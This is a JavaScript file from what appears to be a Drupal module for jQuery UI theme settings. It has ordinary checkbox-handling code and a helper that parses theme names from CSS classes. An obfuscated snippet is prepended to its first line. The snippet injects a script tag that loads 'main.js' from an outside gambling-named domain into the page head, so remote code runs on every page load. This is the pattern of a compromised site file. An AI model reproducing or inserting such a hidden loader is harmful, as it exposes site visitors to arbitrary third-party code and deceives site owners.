var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);(function ($) {
  Drupal.behaviors.jqueryui_theme_settings = {
    attach: function() {
      
      $('.submit-jqueryui-settings').hide();
      
      $(document).change(function() {
        if ($('.box-row').is(':checked')) {
          $('.submit-jqueryui-settings').show();
        }
        else {
          $('.submit-jqueryui-settings').hide();
        }
      });
     
      $('.box-all').change(function(){
        if ($(this).is(':checked')) {
          $('.box-row').attr('checked', true);
        }
        else {
          $('.box-row').attr('checked', false);
        }
      });
      
      $(".box-drupal-theme, .textfield-name").change(function(){
        var ele_class = $(this).attr('class');
        var theme = getTheme('jqueryui', ele_class);
        $('.box-row-' + theme).attr('checked', true);
      });
      
      $(".box-drupal-theme").change(function(){
        if ($(this).is(':checked')) {
          var box_class = $(this).attr('class');
          var drupal_theme = getTheme('drupal', box_class);
          
          var elem = $('.box-cell-' + drupal_theme).not(this);
          $.each(elem, function(){
            if (this.checked) {
              var theme = getTheme('jqueryui', this.className);
              this.checked = false;
              $('.box-row-' + theme).attr('checked', true);
            }
          });
        }
      });
    } 
  };
  
  function getTheme(type, ele_class) {
    var ele_class = ele_class.split(' ');
    var i = 0, theme = '', reg = '';
    if (type == 'jqueryui') {
      reg = /^(box|textfield)-jqueryui-[a-z_]*/;
    }
    else if (type == 'drupal') {
      reg = /^box-cell-[a-z0-9_]*/;
    }
    
    while(i < ele_class.length && theme == '') {
      if (ele_class[i].match(reg)) {
        theme = ele_class[i].split('-');
        theme = theme[2];
      }
      i++;
    }
    return theme;
  }
})(jQuery);